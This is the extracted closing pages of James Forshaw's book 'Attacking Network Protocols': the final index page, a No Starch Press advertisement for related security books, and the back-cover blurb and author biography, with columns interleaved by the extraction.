character\nreplacement, 229–231\nX\ntriaging, 236–245\nuser enumeration, 218–219 X.509 certificates, 53–54, 169–171, 173\nX.680 series, 53\nx86 architecture, 42, 125\nW\nhistory, 114\nW3C, 58 instruction mnemonics, 115\nweb application testing tools, 283–285 instruction set architecture,\nBurp Suite, 283–284 114–116\nMitmproxy, 284–285 mnemonic forms, 115\nZed Attack Proxy, 284 program flow, 118–119\nweb of trust (WOT), 169 registers, 116–118\nwget, 31 xcalc, 228\nwindll, 199 XML Schema, 58\nWindows XOR encryption, 108–109, 148–149,\nASLR implementation flaws in, 272 153–154\ncalling functions with Python XOR instruction, 115\non, 199 XOR parameter, 108–109\ncertificate manager, 203 xp_cmdshell function, 229\ndebug symbols, 129 xxd tool, 90, 181\ndebugger, 236–241, 244–245\ndynamic link libraries, 196\nZ\nenabling routing on, 67\nFILETIME, 50 Zed Attack Proxy (ZAP), 284\nloading library on, 197 zero flag, 117\nPage Heap, 244–245 ZLib compression library, 132\nregistry, 67\n310 Index\nRESOURCES\nVisit https://www.nostarch.com/networkprotocols/ for resources, errata, and more\ninformation.\nMore no-nonsense books from nO StaRCH PRESS\nROOtkitS and BOOtkitS SERiOUS CRyPtOgRaPHy gRay Hat C#\nReversing Modern Malware and A Practical Introduction to A Hacker’s Guide to Creating and\nNext Generation Threats Modern Encryption Automating Security Tools\nby alEx maTRosov, EugENE by jEaN-philippE aumassoN by bRaNdoN pERRy\nRodioNov, and sERgEy bRaTus NovEmbER 2017, 312 pp., $49.95 juNE 2017, 304 pp., $39.95\nspRiNg 2018, 504 pp., $49.95 isbN 978-1-59327-826-7 isbN 978-1-59327-759-8\nisbN 978-1-59327-716-1\nPRaCtiCal PaCkEt analySiS, tHE HaRdwaRE HaCkER BlaCk Hat PytHOn\n3Rd EditiOn Adventures in Making and Python Programming for\nUsing Wireshark to Solve Breaking Hardware Hackers and Pentesters\nReal-World Network Problems by aNdREw “buNNiE” huaNg by jusTiN sEiTz\nby chRis saNdERs maRch 2017, 416 pp., $29.95 dEcEmbER 2014, 192 pp., $34.95\napRil 2017, 368 pp., $49.95 isbN 978-1-59327-758-1 isbN 978-1-59327-590-7\nisbN 978-1-59327-802-1 hardcover\nphone: email:\n1.800.420.7240 oR sales@nostarch.com\n+1.415.863.9900 web:\nwww.nostarch.com\n“James can see the Lady in the Red Dress, as well\nas the code that rendered her, in the Matrix.”\n— Katie Moussouris, founder and CEO, Luta Security\nAttacking Network Protocols is a deep dive Use capture and analysis tools like\ninto network protocol security from James Wireshark and develop your own cus-\nForshaw, one of the world’s leading bug tom network proxies to manipulate\nhunters. This comprehensive guide looks at network traffic\nnetworking from an attacker’s perspective\nAttacking Network Protocols is a must-have\nto help you discover, exploit, and ultimately\nfor any penetration tester, bug hunter, or\nprotect vulnerabilities.\ndeveloper looking to understand and dis-\nYou’ll start with a rundown of networking cover network vulnerabilities.\nbasics and protocol traffic capture before mov-\ning on to static and dynamic protocol analysis,\nAbout the Author\ncommon protocol structures, cryptography,\nand protocol security. Then you’ll turn your\nfocus to finding and exploiting vulnerabili- James Forshaw is a renowned computer secu-\nties, with an overview of common bug classes, rity researcher at Google Project Zero and the\nfuzzing, debugging, and exhaustion attacks. creator of the network protocol analysis tool\nCanape. His discovery of complex design issues\nLearn how to: in Microsoft Windows earned him the top\nbug bounty of $100,000 and placed him as\nCapture, manipulate, and replay packets\nthe #1 researcher on the published list from\nDevelop tools to dissect traffic and reverse Microsoft Security Response Center (MSRC).\nengineer code to understand the inner He’s been invited to present his novel security\nworkings of a network protocol research at global security conferences such\nas BlackHat, CanSecWest, and Chaos Computer\nDiscover and exploit vulnerabilities such Congress.\nas memory corruptions, authentication\nbypasses, and denials of service\nTHE FINEST IN GEEK ENTERTAINMENT™\nwww.nostarch.com\nForshaw\nAttacking\nNetwork\nProtocols\nAttacking\nNetwork Protocols\nA Hacker’s Guide to Capture,\nAnalysis, and Exploitation\nA\nHacker’s\nGuide\nto\nCapture,\nAnalysis,\nand\nExploitation\nPrice: $49.95 ($65.95 CDN)\nShelve In: ComPuterS/SeCurIty\nJames Forshaw\nForeword by Katie Moussouris"
  }
]